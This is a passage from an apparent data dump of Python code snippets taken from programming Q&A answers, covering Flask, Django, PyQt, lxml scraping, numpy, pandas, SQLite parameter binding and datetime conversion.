</snippet></ROW><ROW><id>11940493</id><snippet>remember_unique_id</snippet></ROW><ROW><id>11940493</id><snippet>call_after_request_callbacks</snippet></ROW><ROW><id>11940493</id><snippet>for callback in getattr(g, 'after_request_callbacks', ()):
    result = callback(response)
    if result is not None:
        response = result
</snippet></ROW><ROW><id>11940493</id><snippet>response</snippet></ROW><ROW><id>11940493</id><snippet>after_request</snippet></ROW><ROW><id>11940493</id><snippet>TypeError</snippet></ROW><ROW><id>11940521</id><snippet>URLValidator</snippet></ROW><ROW><id>11940521</id><snippet>check_exists</snippet></ROW><ROW><id>11940521</id><snippet>HEAD</snippet></ROW><ROW><id>11940521</id><snippet>req = urllib2.Request(url, None, headers)
req.get_method = lambda: 'HEAD'
...
opener.open(req, timeout=10)
</snippet></ROW><ROW><id>11940521</id><snippet>HEAD</snippet></ROW><ROW><id>11940521</id><snippet>carl@chaffinch:~$ HEAD http://www.amazon.com
405 MethodNotAllowed
Date: Mon, 13 Aug 2012 18:50:56 GMT
Server: Server
Vary: Accept-Encoding,User-Agent
Allow: POST, GET
...
</snippet></ROW><ROW><id>11940521</id><snippet>URLValidator</snippet></ROW><ROW><id>11940521</id><snippet>GET</snippet></ROW><ROW><id>11940521</id><snippet>POST</snippet></ROW><ROW><id>11940521</id><snippet>check_exists</snippet></ROW><ROW><id>11940521</id><snippet>core/validators.py</snippet></ROW><ROW><id>11940521</id><snippet>URLField</snippet></ROW><ROW><id>11940521</id><snippet>verify_exists</snippet></ROW><ROW><id>11941013</id><snippet>[[[a1, a2, a3]  , [b1, b2, b3] , [c1, c2, c3]],
[[d1, d2, d3]  , [e1, e2, e3] , [f1, f2, f3]]]
</snippet></ROW><ROW><id>11941074</id><snippet>dict</snippet></ROW><ROW><id>11941074</id><snippet>&gt;&gt;&gt; dict([('1', 'red'),('2', 'blue'),('3' 'purple')]) # missing comma in last item
Traceback (most recent call last):
  File "&lt;pyshell#166&gt;", line 1, in &lt;module&gt;
    dict([('1', 'red'),('2', 'blue'),('3' 'purple')]) 
ValueError: dictionary update sequence element #2 has length 7; 2 is required
</snippet></ROW><ROW><id>11941074</id><snippet>&gt;&gt;&gt; dict([('1', 'red'),('2', 'blue'),('purple')]) # last "tuple" has one item
Traceback (most recent call last):
  File "&lt;pyshell#167&gt;", line 1, in &lt;module&gt;
    dict([('1', 'red'),('2', 'blue'),('purple')])
ValueError: dictionary update sequence element #2 has length 6; 2 is required
</snippet></ROW><ROW><id>11941099</id><snippet>from PyQt4.QtCore import Qt, QVariant
from PyQt4.QtGui import QApplication, QTableWidget, QTableWidgetItem

class MyTableWidgetItem(QTableWidgetItem):
    def __lt__(self, other):
        if ( isinstance(other, QTableWidgetItem) ):
            my_value, my_ok = self.data(Qt.EditRole).toInt()
            other_value, other_ok = other.data(Qt.EditRole).toInt()

            if ( my_ok and other_ok ):
                return my_value &lt; other_value

        return super(MyTableWidgetItem, self).__lt__(other)

if ( __name__ == '__main__' ):
    app = None
    if ( QApplication.instance() is None ):
        app = QApplication([])

    widget = QTableWidget()
    widget.setWindowFlags(Qt.Dialog)
    widget.setSortingEnabled(True)

    widget.setRowCount(50)
    widget.setColumnCount(3)
    for row in range(50):
       # create a normal QTableWidgetItem
       a = QTableWidgetItem()
       a.setText(str(row))
       widget.setItem(row, 0, a)

       # create a proper sorted item
       b = QTableWidgetItem()
       b.setData(Qt.EditRole, QVariant(row))
       widget.setItem(row, 1, b)

       # create a custom sorted item
       c = MyTableWidgetItem()
       c.setData(Qt.EditRole, QVariant(row))
       widget.setItem(row, 2, c)

    widget.show()
    if ( app ):
        app.exec_()
</snippet></ROW><ROW><id>11941164</id><snippet>lxml</snippet></ROW><ROW><id>11941164</id><snippet>#!/usr/bin/env python
import urllib2
from lxml import html # $ apt-get install python-lxml or $ pip install lxml

page = urllib2.urlopen('http://stackoverflow.com/q/11939631')
doc = html.parse(page).getroot()

div = doc.get_element_by_id('question')
for tr in div.find('table').iterchildren('tr'):
    for td in tr.iterchildren('td'):
        print(td.text_content()) # process td
</snippet></ROW><ROW><id>11941164</id><snippet>#!/usr/bin/env python
from pyquery import PyQuery # $ apt-get install python-pyquery or
                            # $ pip install pyquery

# d is like the $ in jquery
d = PyQuery(url='http://stackoverflow.com/q/11939631', parser='html')
for tr in d("#question table &gt; tr"):
    for td in tr.iterchildren('td'):
        print(td.text_content())
</snippet></ROW><ROW><id>11941164</id><snippet>pyquery</snippet></ROW><ROW><id>11941164</id><snippet>lxml</snippet></ROW><ROW><id>11941164</id><snippet>#!/usr/bin/env python
import urllib2
from lxml import html

page = urllib2.urlopen('http://stackoverflow.com/q/11939631')
doc = html.parse(page).getroot()
for tr in doc.cssselect('#question table &gt; tr'):
    for td in tr.iterchildren('td'):
        print(td.text_content()) # process td
</snippet></ROW><ROW><id>11941164</id><snippet>#question</snippet></ROW><ROW><id>11941227</id><snippet>pairs = array([[x, y] for x, y in zip(X[:, col1], X[:, col2]) \
                   if (x not in na_values) and (y not in na_values)])
</snippet></ROW><ROW><id>11941227</id><snippet>x1 = X[:, col1]
x2 = X[:, col2]
mask = ~np.isnan(x1) * ~np.isnan(x2)
if mask.sum() == 0:
    continue
dist = dist_func(x1[mask], x2[mask])
</snippet></ROW><ROW><id>11941227</id><snippet>dist_matrix = np.empty((num_cols, num_cols))
for col1 in range(num_cols):
    for col2 in range(num_cols):
        ...
        dist_matrix[col1, col2] = dist
</snippet></ROW><ROW><id>11941227</id><snippet>dist_matrix = np.empty((num_cols, num_cols))
for col1 in range(num_cols):
    for col2 in range(col1, num_cols):
        ...
        dist_matrix[col1, col2] = dist
        dist_matrix[col2, col1] = dist
</snippet></ROW><ROW><id>11941282</id><snippet>that/</snippet></ROW><ROW><id>11941282</id><snippet>that/</snippet></ROW><ROW><id>11941282</id><snippet>with open(filename) as f:
    for num, line in enumerate(f, 1):
        if 'that/' in line:
            myString = line
            where_is_that = myString.find('that/')
            mySub = myString[where_is_that:myString.find(' ', where_is_that)]
            print(mySub, str(num))
            formattedLines.append(mySub + ' ' + str(num) + '\n')
</snippet></ROW><ROW><id>11941380</id><snippet>bin</snippet></ROW><ROW><id>11941380</id><snippet>int</snippet></ROW><ROW><id>11941458</id><snippet>http://1.appid.appspot.com   // version "1"

http://eqsudmoain.appid.appspot.com   // version "eqsudmoain"

http://appid.appspot.com   // default version
</snippet></ROW><ROW><id>11941458</id><snippet>*.appid.appspot.com</snippet></ROW><ROW><id>11941458</id><snippet>*.yourdomain.com</snippet></ROW><ROW><id>11941528</id><snippet>getattr(action, key)
</snippet></ROW><ROW><id>11941528</id><snippet>getattribute</snippet></ROW><ROW><id>11941612</id><snippet>is_attending</snippet></ROW><ROW><id>11941612</id><snippet>is_attending</snippet></ROW><ROW><id>11941612</id><snippet>upcoming</snippet></ROW><ROW><id>11941612</id><snippet>request.user</snippet></ROW><ROW><id>11941612</id><snippet>is_attending</snippet></ROW><ROW><id>11941612</id><snippet>Event</snippet></ROW><ROW><id>11941612</id><snippet>@register.simple_tag(takes_context=True)
def user_is_attending(context, event):
    if type(event) != Event:
        raise template.TemplateSyntaxError("Must provide event")
    request = context['request']
    if event.attendee_set.filter(profile__user=request.user).exists():
        return 'attending'
    else:
        return 'not attending'
</snippet></ROW><ROW><id>11941612</id><snippet>{% user_is_attending event %}
</snippet></ROW><ROW><id>11941651</id><snippet>NetstringReceiver</snippet></ROW><ROW><id>11941651</id><snippet>LineReceiver</snippet></ROW><ROW><id>11941651</id><snippet>NetstringReceiver</snippet></ROW><ROW><id>11941747</id><snippet>def filter(**kwargs):
    for i in kwargs:
        field, condition = i.split('__')
        print field, condition

&gt;&gt;&gt; filter(choice__startswith='prefix-')
choice startswith
</snippet></ROW><ROW><id>11941829</id><snippet>table(column)</snippet></ROW><ROW><id>11941829</id><snippet>cur.execute("CREATE TABLE definitions (def_id INTEGER, def TEXT,"
           "word_def INTEGER, FOREIGN KEY(word_def) REFERENCES vocab(vocab_id))")
#                                                             ^     ^         ^
</snippet></ROW><ROW><id>11941855</id><snippet>keys</snippet></ROW><ROW><id>11941855</id><snippet>dict</snippet></ROW><ROW><id>11941855</id><snippet>for i in d.keys():
</snippet></ROW><ROW><id>11941855</id><snippet>keys</snippet></ROW><ROW><id>11941855</id><snippet>list</snippet></ROW><ROW><id>11941855</id><snippet>for i in list(d):
</snippet></ROW><ROW><id>11942374</id><snippet>&gt;&gt;&gt; paths
['9999\\New_folder\\A\\23818\\files\\', '9999\\New_folder\\A\\18283_HO\\files']
&gt;&gt;&gt; for path in paths:
...     print path.split('\\')[3]
...
23818
18283_HO
</snippet></ROW><ROW><id>11942465</id><snippet>&gt;&gt;&gt; first, middle, last, dob = 'john..doe.1985'.split('.')
&gt;&gt;&gt; first
'john'
&gt;&gt;&gt; middle
''
&gt;&gt;&gt; last
'doe'
&gt;&gt;&gt; dob
'1985'
</snippet></ROW><ROW><id>11942631</id><snippet>file</snippet></ROW><ROW><id>11942631</id><snippet>open</snippet></ROW><ROW><id>11942631</id><snippet>&gt;&gt;&gt; type(file)
&lt;type 'type'&gt;
&gt;&gt;&gt; type(open)
&lt;type 'builtin_function_or_method'&gt;
</snippet></ROW><ROW><id>11942631</id><snippet>open</snippet></ROW><ROW><id>11942631</id><snippet>file()</snippet></ROW><ROW><id>11942631</id><snippet>file</snippet></ROW><ROW><id>11942631</id><snippet>open</snippet></ROW><ROW><id>11942631</id><snippet>file</snippet></ROW><ROW><id>11942631</id><snippet>file</snippet></ROW><ROW><id>11942631</id><snippet>open</snippet></ROW><ROW><id>11942631</id><snippet>file</snippet></ROW><ROW><id>11942631</id><snippet>file()</snippet></ROW><ROW><id>11942631</id><snippet>int()</snippet></ROW><ROW><id>11942631</id><snippet>&gt;&gt;&gt; type(int(2**64)) is long
True
&gt;&gt;&gt; type(int()) is int
True
&gt;&gt;&gt; int is long
False
</snippet></ROW><ROW><id>11942692</id><snippet>time.sleep(.1)</snippet></ROW><ROW><id>11942697</id><snippet>xs</snippet></ROW><ROW><id>11942697</id><snippet>In [5]: df.xs('a', level=0)
Out[5]: 
        value1  value2
group2                
c          1.1     7.1
c          2.0     8.0
d          3.0     9.0

In [6]: df.xs('c', level='group2')
Out[6]: 
        value1  value2
group1                
a          1.1     7.1
a          2.0     8.0
</snippet></ROW><ROW><id>11942813</id><snippet>spot.execute("INSERT INTO Words VALUES(?,?)", word_count,word) 
</snippet></ROW><ROW><id>11942813</id><snippet>spot.execute</snippet></ROW><ROW><id>11942813</id><snippet>word_count</snippet></ROW><ROW><id>11942813</id><snippet>word</snippet></ROW><ROW><id>11942813</id><snippet>spot.execute("INSERT INTO Words VALUES(?,?)", (word_count,word))
</snippet></ROW><ROW><id>11942944</id><snippet>def sort(names, rank):
    lst=[]
    for x in range(0, len(names)):
        lst.append((int(rank[x]), names[x]))
    lst.sort(key=lambda x: (-x[0],len(x[1]), ord(x[1][0])) )
    newArr = []
    for z in range(0, len(lst)):
        row = lst[z]
        newArr.append(row[1] + " " + str(row[0]))
    return newArr
</snippet></ROW><ROW><id>11942944</id><snippet>def sort(names, rank):
    lst=[]
    for index, name in enumerate(names):
        lst.append((int(rank[index]), name))
    lst.sort(key=lambda x: (-x[0],len(x[1]),  ord(x[1][0])))
    output = []
    for row in lst:
        output.append(row[1] + " " + str(row[0]))
    return output
</snippet></ROW><ROW><id>11943281</id><snippet>a</snippet></ROW><ROW><id>11943281</id><snippet>float a</snippet></ROW><ROW><id>11943281</id><snippet>.subs</snippet></ROW><ROW><id>11943355</id><snippet>while True:
    dline = g.readline()
    if not dline:
        break
    print "&lt;&lt;" + dline + "&gt;&gt;"
</snippet></ROW><ROW><id>11943355</id><snippet>readline()</snippet></ROW><ROW><id>11943372</id><snippet>class RequestsProxy(object):
    def __init__(self):
        self.special_sauce_decorator = special_sauce_indeed()
        self._requests = __import__("requests")

    def __getattr__(self, attrname):
        val = getattr(self._requests, attrname) 
        if callable(val):
            return self.special_sauce_decorator(val)
        return val
</snippet></ROW><ROW><id>11943372</id><snippet>&gt;&gt;&gt; def special_sauce_indeed():
        def decorator(f):
                def wrapped(*args, **kwargs):
                        print 'wrapped'
                        return f(*args, **kwargs)
                return wrapped
        return decorator

&gt;&gt;&gt; class OsProxy(object):
        def __init__(self):
            self.special_sauce_decorator = special_sauce_indeed()
            self._requests = __import__("os")

        def __getattr__(self, attrname):
            val = getattr(self._requests, attrname)
            if callable(val):
                return self.special_sauce_decorator(val)
            return val


&gt;&gt;&gt; os = OsProxy()
&gt;&gt;&gt; os.listdir(".")
wrapped
['DLLs', 'Doc', 'faiojerf.py', 'func_counter_test.py', 'include', 'inet_time.py', 'kcol.py', 'Lib', 'libs', 'LICENSE.txt', 'memoize_test.py', 'minpy.py', 'NEWS.txt', 'numpy-wininst.log', 'paren_test.py', 'PIL-wininst.log', 'psycopg2-wininst.log', 'python.exe', 'pythonw.exe', 'pywin32-wininst.log', 'README.txt', 'Removenumpy.exe', 'RemovePIL.exe', 'Removepsycopg2.exe', 'Removepywin32.exe', 'Removescipy.exe', 'Removesetuptools.exe', 'scipy-wininst.log', 'Scripts', 'setuptools-wininst.log', 'slots.py', 'so1.py', 'staticvar.py', 'summing.py', 'taojiwjiot.,py', 'tcl', 'templol.py', 'test.py', 'thunkify_test.py', 'TicketNumberGenerator.py', 'Tools', 'w9xpopen.exe', 'wordcount.py']
</snippet></ROW><ROW><id>11943534</id><snippet>a</snippet></ROW><ROW><id>11943534</id><snippet>b</snippet></ROW><ROW><id>11943534</id><snippet>c</snippet></ROW><ROW><id>11943534</id><snippet>&gt;&gt;&gt; class ShowIndex(object):
...     def __getitem__(self, index):
...         print index
... 
&gt;&gt;&gt; ShowIndex()[:,:]
(slice(None, None, None), slice(None, None, None))
&gt;&gt;&gt; ShowIndex()[...,:]
(Ellipsis, slice(None, None, None))
&gt;&gt;&gt; ShowIndex()[0:5:2,::-1]
(slice(0, 5, 2), slice(None, None, -1))
&gt;&gt;&gt; ShowIndex()[0:5:2,np.arange(3)]
(slice(0, 5, 2), array([0, 1, 2]))
&gt;&gt;&gt; ShowIndex()[0:5:2]
slice(0, 5, 2)
&gt;&gt;&gt; ShowIndex()[5, 5]
(5, 5)
&gt;&gt;&gt; ShowIndex()[5]
5
&gt;&gt;&gt; ShowIndex()[np.arange(3)]
[0 1 2]
</snippet></ROW><ROW><id>11943534</id><snippet>slice</snippet></ROW><ROW><id>11943534</id><snippet>Ellipsis</snippet></ROW><ROW><id>11943534</id><snippet>numpy</snippet></ROW><ROW><id>11943534</id><snippet>int</snippet></ROW><ROW><id>11943534</id><snippet>slice</snippet></ROW><ROW><id>11943534</id><snippet>Ellipsis</snippet></ROW><ROW><id>11943534</id><snippet>None</snippet></ROW><ROW><id>11943534</id><snippet>numpy.newaxis</snippet></ROW><ROW><id>11943534</id><snippet>numpy</snippet></ROW><ROW><id>11943534</id><snippet>a</snippet></ROW><ROW><id>11943534</id><snippet>[0, 1]</snippet></ROW><ROW><id>11943534</id><snippet>b</snippet></ROW><ROW><id>11943534</id><snippet>[0]</snippet></ROW><ROW><id>11943534</id><snippet>intp</snippet></ROW><ROW><id>11943534</id><snippet>[0, 1]</snippet></ROW><ROW><id>11943534</id><snippet>2</snippet></ROW><ROW><id>11943666</id><snippet>self</snippet></ROW><ROW><id>11943666</id><snippet>def union(self,p,q):
        self.pid = self.id[p]
        self.qid = self.id[q]
        for i in range(len(self.id)):
                if(self.id[i]==self.pid):
                        self.id[i]=self.qid
</snippet></ROW><ROW><id>11943666</id><snippet>def union(self,p,q):
    pid = self.id[p]
    qid = self.id[q]
    for i in range(len(self.id)):
        if self.id[i] == pid:
            self.id[i] = qid
</snippet></ROW><ROW><id>11943666</id><snippet>self</snippet></ROW><ROW><id>11943682</id><snippet>X[i]</snippet></ROW><ROW><id>11943682</id><snippet>scipy.sparse.csr_matrix</snippet></ROW><ROW><id>11943682</id><snippet>for row in X:
    do_stuff(row)
</snippet></ROW><ROW><id>11943682</id><snippet>for i, row in enumerate(X):
    do_other_stuff(i, row)
</snippet></ROW><ROW><id>11943796</id><snippet>[artist for artist in myJson['Artists'] if artist['profile']['age'] == 7]</snippet></ROW><ROW><id>11943864</id><snippet>model.py</snippet></ROW><ROW><id>11943864</id><snippet>Userdb</snippet></ROW><ROW><id>11943864</id><snippet>import model

print model.Userdb.get_by_id(12)
</snippet></ROW><ROW><id>11943868</id><snippet>&gt;&gt;&gt; class Num(object):
...     def __init__(self, i):
...             self.i = i
... 
&gt;&gt;&gt; print map(Num, range(10))
[&lt;__main__.Num object at 0x100493450&gt;, &lt;__main__.Num object at 0x100493490&gt;, &lt;__main__.Num object at 0x1004934d0&gt;, &lt;__main__.Num object at 0x100493510&gt;, &lt;__main__.Num object at 0x100493550&gt;, &lt;__main__.Num object at 0x100493590&gt;, &lt;__main__.Num object at 0x1004935d0&gt;, &lt;__main__.Num object at 0x100493610&gt;, &lt;__main__.Num object at 0x100493650&gt;, &lt;__main__.Num object at 0x100493690&gt;]
</snippet></ROW><ROW><id>11944027</id><snippet>def resizeConsoleEvent(self, resizeObject):
    if not self.keyPressDown and not self.blockResizing:
        # calculate maximum columns and lines based on a '|' character
        font = self.ui.console.currentFont()
        fmetric = QtGui.QFontMetrics(font)
        fontPixelWidth = fmetric.width("|")
        fontPixelHeight = fmetric.height()
        availableWidthPixels = int(self.ui.console.geometry().width())
        availableHeightPixels = int(self.ui.console.geometry().height())
        # Calculate columns and lines w/ adjustments for rounding
        self.consoleColumns = int(availableWidthPixels / fontPixelWidth) + 1
        self.consoleLines = int(availableHeightPixels / fontPixelHeight) - 3

        # resize the pyte screen I'm using with the calculated information
        self.shell.resizeConsole(self.consoleLines, self.consoleColumns)

        # block double resize event
        self.keyPressDown = False
        return False
    else:

        return True
</snippet></ROW><ROW><id>11944031</id><snippet>def extend_prefix(w, letters, results):
        if w in WORDS: results.add(w)
        if w not in PREFIXES: return
        for L in letters:
            extend_prefix(w + L, letters.replace(L, "", 1), results)
</snippet></ROW><ROW><id>11944031</id><snippet>results = results | result</snippet></ROW><ROW><id>11944048</id><snippet>sums = {k: sum(i for i in v if isinstance(i, int)) for k, v in d.items()}
</snippet></ROW><ROW><id>11944048</id><snippet>sums = dict((k, sum(i for i in v if isinstance(i, int))) for k, v in d.items())
</snippet></ROW><ROW><id>11944048</id><snippet>&gt;&gt;&gt; {k: sum(i for i in v if isinstance(i, int)) for k, v in d.items()}
{'a': 6, 'c': 7, 'b': 7, 'e': 4, 'd': 7, 'g': 4, 'f': 4}
</snippet></ROW><ROW><id>11944331</id><snippet>request.responseHeaders.setRawHeaders(
    'Content-Disposition', ['attachment; filename="foo"'])
</snippet></ROW><ROW><id>11944332</id><snippet>centers_x = [np.mean([q[0] for q in coordinates if q[-1]==n]) for n in range(3)]
</snippet></ROW><ROW><id>11944392</id><snippet>join</snippet></ROW><ROW><id>11944392</id><snippet>&gt;&gt;&gt; new_name = ['j', 'k', 'e']
&gt;&gt;&gt; print ''.join(new_name)
jke
</snippet></ROW><ROW><id>11944392</id><snippet>&gt;&gt;&gt; name = 'jake'
&gt;&gt;&gt; new_name = name[:1] + name[2:]
&gt;&gt;&gt; print new_name
jke
</snippet></ROW><ROW><id>11944499</id><snippet>re.sub(r'(if\s*\([^{]+\)\s*){([^;]*;)\s*}', r'\1\2', yourstring)
</snippet></ROW><ROW><id>11944501</id><snippet>class myClass(object):
    def __init__(self):
        self.x = 1

    @property
    def x(self):
        return self._x

    @x.setter
    def x(self, x):
        self._x = x
        self.y = 2 * self._x
</snippet></ROW><ROW><id>11944501</id><snippet>&gt;&gt;&gt; c= myClass()
&gt;&gt;&gt; c.x = 10
&gt;&gt;&gt; c.x
10
&gt;&gt;&gt; c.y
20
</snippet></ROW><ROW><id>11944612</id><snippet>http://localhost:8080/_ah/admin
</snippet></ROW><ROW><id>11944705</id><snippet>subversion</snippet></ROW><ROW><id>11944705</id><snippet>pysvn</snippet></ROW><ROW><id>11944705</id><snippet>subprocess</snippet></ROW><ROW><id>11944705</id><snippet>svn</snippet></ROW><ROW><id>11944910</id><snippet>def week_difference(start, end):
    assert start &lt;= end
    start_year, start_week, start_dayofweek = start.isocalendar()
    end_year, end_week, end_dayofweek = end.isocalendar()

    return ((end_year - start_year) * 52) - start_week + end_week
</snippet></ROW><ROW><id>11944910</id><snippet>import datetime as dt
# same week
In [1]: week_difference(dt.datetime(2012, 8, 1),  dt.datetime(2012, 8, 1))
Out[1]: 0

# your example (see note below) 
In [2]: week_difference(dt.datetime(2012, 8, 1),  dt.datetime(2012, 8, 13))
Out[2]: 2

# across years
In [3]: week_difference(dt.datetime(2011, 8, 1),  dt.datetime(2012, 8, 13))
Out[3]: 54

# year boundary: second last business week of 2011, to first business week of 2012
# which is the same business week as the last business week of 2011
In [4]: week_difference(dt.datetime(2011, 12, 20),  dt.datetime(2012, 1, 1))
Out[4]: 1

In [5]: week_difference(dt.datetime(2011, 12, 18),  dt.datetime(2012, 1, 1))
Out[5]: 2
</snippet></ROW><ROW><id>11944910</id><snippet>1</snippet></ROW><ROW><id>11944974</id><snippet>cls</snippet></ROW><ROW><id>11944974</id><snippet>__init__.py</snippet></ROW><ROW><id>11944974</id><snippet>levels.py</snippet></ROW><ROW><id>11944974</id><snippet>from ..game import someConstant</snippet></ROW><ROW><id>11944975</id><snippet>for i in range(len(some_list)):
    print lst[i], lst2[i], lst3[i], lst4[i], lst5[i]
</snippet></ROW><ROW><id>11945011</id><snippet>re.sub</snippet></ROW><ROW><id>11945011</id><snippet>.group(n)</snippet></ROW><ROW><id>11945011</id><snippet>re.sub("(a+)(b+)", lambda match: "{0} as and {1} bs ".format(
    len(match.group(1)), len(match.group(2))
), "aaabbaabbbaaaabb")
# Output is '3 as and 2 bs 2 as and 3 bs 4 as and 2 bs '
</snippet></ROW><ROW><id>11945097</id><snippet>self.args = args</snippet></ROW><ROW><id>11945097</id><snippet>args</snippet></ROW><ROW><id>11945097</id><snippet>Error(23)</snippet></ROW><ROW><id>11945151</id><snippet>class fc(db.Model):
    feature = db.StringProperty()
    category = db.StringProperty()
    count = db.IntegerProperty()
</snippet></ROW><ROW><id>11945151</id><snippet>class fc_class(db.Model):
    feature = db.StringProperty()
    category = db.StringProperty()
    count = db.IntegerProperty()
fc = fc_class()
</snippet></ROW><ROW><id>11945212</id><snippet>__</snippet></ROW><ROW><id>11945212</id><snippet>user = UserProfile.objects.filter(user__username=request.user.username)
</snippet></ROW><ROW><id>11945212</id><snippet>request.user</snippet></ROW><ROW><id>11945212</id><snippet>User</snippet></ROW><ROW><id>11945212</id><snippet>UserProfile</snippet></ROW><ROW><id>11945212</id><snippet>user = request.user.get_profile()
</snippet></ROW><ROW><id>11945212</id><snippet>UserProfile.objects.get(user=request.user)
</snippet></ROW><ROW><id>11945212</id><snippet>QuerySet</snippet></ROW><ROW><id>11945212</id><snippet>request.user.get_profile() == 
    UserProfile.objects.filter(user__username=request.user.username)[0]
</snippet></ROW><ROW><id>11945488</id><snippet>mult_table(1,1)</snippet></ROW><ROW><id>11945488</id><snippet>mult_table(12,3)</snippet></ROW><ROW><id>11945488</id><snippet>if n == 1</snippet></ROW><ROW><id>11945488</id><snippet>n == x</snippet></ROW><ROW><id>11945488</id><snippet>mult_table</snippet></ROW><ROW><id>11945488</id><snippet>      if n == 1:
        print i*n,
      else:
        print repr(i*n).rjust(3),
</snippet></ROW><ROW><id>11945488</id><snippet>print</snippet></ROW><ROW><id>11945577</id><snippet>&gt;&gt;&gt; [[(x+y)*.5  for x,y in zip(*item)] for item in zip(alist, alist[1:])]
[[5.5, 6.0], [7.5, 7.5]]
</snippet></ROW><ROW><id>11945577</id><snippet>&gt;&gt;&gt; from itertools import izip, islice
&gt;&gt;&gt; [[(x+y)*.5  for x,y in izip(*item)] for item in izip(alist, islice(alist,1,None))]
[[5.5, 6.0], [7.5, 7.5]]
</snippet></ROW><ROW><id>11945577</id><snippet>&gt;&gt;&gt; alist = [[1,2],[10,10],[5,5]]
&gt;&gt;&gt; if len(alist)%2:
...     alist.append(alist[-1])
... 
&gt;&gt;&gt; [[(x+y)*.5  for x,y in zip(*item)] for item in zip(alist, alist[1:])]
[[5.5, 6.0], [7.5, 7.5], [5.0, 5.0]]
&gt;&gt;&gt; [[(x+y)*.5  for x,y in zip(*item)] for item in zip(alist[::2], alist[1::2])]
[[5.5, 6.0], [5.0, 5.0]]
</snippet></ROW><ROW><id>11945612</id><snippet>query(Article).filter(Article.focusid.in_(topic_ids)).order_by(desc(Article.datepublished)).limit(10)
</snippet></ROW><ROW><id>11945643</id><snippet>flask.Response(response=ret, status=200, headers=None, mimetype='application/json', content_type=None, direct_passthrough=False)
</snippet></ROW><ROW><id>11945856</id><snippet>ind = something()
for field in ['id', 'name']:
    print getattr(ind, field)
</snippet></ROW><ROW><id>11945876</id><snippet>None, False and True</snippet></ROW><ROW><id>11945876</id><snippet>None, False</snippet></ROW><ROW><id>11945876</id><snippet>'', "", """"""</snippet></ROW><ROW><id>11945876</id><snippet>False</snippet></ROW><ROW><id>11945876</id><snippet>if</snippet></ROW><ROW><id>11945876</id><snippet>{% if profile.user.first_name == None %}
{% if profile.user.first_name is None %}
{% if not profile.user.first_name %}
</snippet></ROW><ROW><id>11945876</id><snippet># someapp/models.py
class UserProfile(models.Model):
    user = models.OneToOneField('auth.User')
    # other fields

    def get_full_name(self):
        if not self.user.first_name:
            return
        return ' '.join([self.user.first_name, self.user.last_name])

# template
{{ user.get_profile.get_full_name }}
</snippet></ROW><ROW><id>11945905</id><snippet>#!/usr/bin/env python
import itertools, operator

def all_factors(prime_dict):
    series = [[p**e for e in range(maxe+1)] for p, maxe in prime_dict.items()]
    for multipliers in itertools.product(*series):
        yield reduce(operator.mul, multipliers)
</snippet></ROW><ROW><id>11945905</id><snippet>prime_dict = {2:3, 3:1, 5:2}
L = sorted(all_factors(prime_dict))
number_of_divisors = reduce(lambda prod, e: prod*(e+1), prime_dict.values(),1)
assert len(L) == number_of_divisors
# -&gt; [1, 2, 3, 4, 5, 6, 8, 10, 12, 15, 20, 24,
#     25, 30, 40, 50, 60, 75, 100, 120, 150, 200, 300, 600]
</snippet></ROW><ROW><id>11945905</id><snippet>n, isodd = divmod(len(L), 2)
print(zip(L[:n], reversed(L[n + isodd:])))
if isodd: # number is perfect square
   print((L[n], L[n]))
</snippet></ROW><ROW><id>11945905</id><snippet>[(1, 600), (2, 300), (3, 200), (4, 150), (5, 120), (6, 100),
 (8, 75), (10, 60), (12, 50), (15, 40), (20, 30), (24, 25)]
</snippet></ROW><ROW><id>11945905</id><snippet>x00000...</snippet></ROW><ROW><id>11946180</id><snippet>id</snippet></ROW><ROW><id>11946180</id><snippet>integer</snippet></ROW><ROW><id>11946180</id><snippet>product = Mattress.objects.filter(owner = user)
</snippet></ROW><ROW><id>11946180</id><snippet>user</snippet></ROW><ROW><id>11946180</id><snippet>id</snippet></ROW><ROW><id>11946406</id><snippet>class Organisation(db.Model):
    name=db.StringProperty()
    code=db.StringProperty()

    @classmethod
    def generate_code(cls):
        import random
        codeChars='ABCDEF0123456789'
        while True: # Make sure code is unique
            code=random.choice(codeChars)+random.choice(codeChars)+\
                    random.choice(codeChars)+random.choice(codeChars)
            if not cls.all().filter('code = ',code).get(keys_only=True):

        return code

    @classmethod
    def make_organisation(cls,*args,**kwargs):
        new_org = cls(*args,**kwargs)
        new_org.code = cls.generate_code()
        return new_org
</snippet></ROW><ROW><id>11946832</id><snippet>def countLetters(word):
    word=list(word)
    word.sort()
    trans=[]
    for j in word:
        row=[]
        a=word.count(j)
        row.append(j)
        row.append(a)
        trans.append(tuple(row))
    ans = list(set(trans))
    ans.sort()
    return ans
</snippet></ROW><ROW><id>11946983</id><snippet>pydbg</snippet></ROW><ROW><id>11946983</id><snippet>C:\Python27\lib\</snippet></ROW><ROW><id>11946983</id><snippet>C:\Python27\lib\site-packages\</snippet></ROW><ROW><id>11947152</id><snippet>Children</snippet></ROW><ROW><id>11947152</id><snippet>parent_ids = db.Parents.find({'name': 'foo'}).distinct('_id')
children = db.Children.find({'parent': {'$in': parent_ids}})
</snippet></ROW><ROW><id>11947152</id><snippet>child</snippet></ROW><ROW><id>11947152</id><snippet>parent</snippet></ROW><ROW><id>11947302</id><snippet>129893678626216000</snippet></ROW><ROW><id>11947302</id><snippet>1,298,936,786.262,160,00</snippet></ROW><ROW><id>11947302</id><snippet>&gt;&gt;&gt; from datetime import datetime
&gt;&gt;&gt; datetime.utcfromtimestamp(129893678626216000/1e8)
datetime.datetime(2011, 2, 28, 23, 46, 26, 262160)
</snippet></ROW><ROW><id>11947302</id><snippet>&gt;&gt;&gt; from datetime import datetime, timedelta
&gt;&gt;&gt; datetime(1601, 1, 1, 0, 0, 0) + timedelta(seconds = 129893678626216000/1e7)
datetime.datetime(2012, 8, 13, 21, 44, 22, 621599)
</snippet></ROW><ROW><id>11947302</id><snippet>&gt;&gt;&gt; 129893678626216000 / 1e7 - 11644473600
1344894262.6215992
</snippet></ROW><ROW><id>11947511</id><snippet>apt-get install python-virtualenv</snippet></ROW><ROW><id>11947511</id><snippet>apt-get purge python-virtualenv &amp;&amp; easy_install virtualenv</snippet></ROW><ROW><id>11947595</id><snippet>def is_list(value):
    return isinstance(value, list)
</snippet></ROW><ROW><id>11947595</id><snippet>j = jinja2.Jinja2(app)
j.environment.filters.update({
        'is_list': is_list,
})
</snippet></ROW><ROW><id>11947831</id><snippet>background = canvas.copy_from_bbox(ax.bbox)</snippet></ROW><ROW><id>11947831</id><snippet>canvas.draw()</snippet></ROW><ROW><id>11947831</id><snippet>plt.show(block=False)</snippet></ROW><ROW><id>11947831</id><snippet>import sys
import matplotlib.pyplot as plt
import time
import numpy


fig = plt.figure()
ax = fig.add_subplot(111)
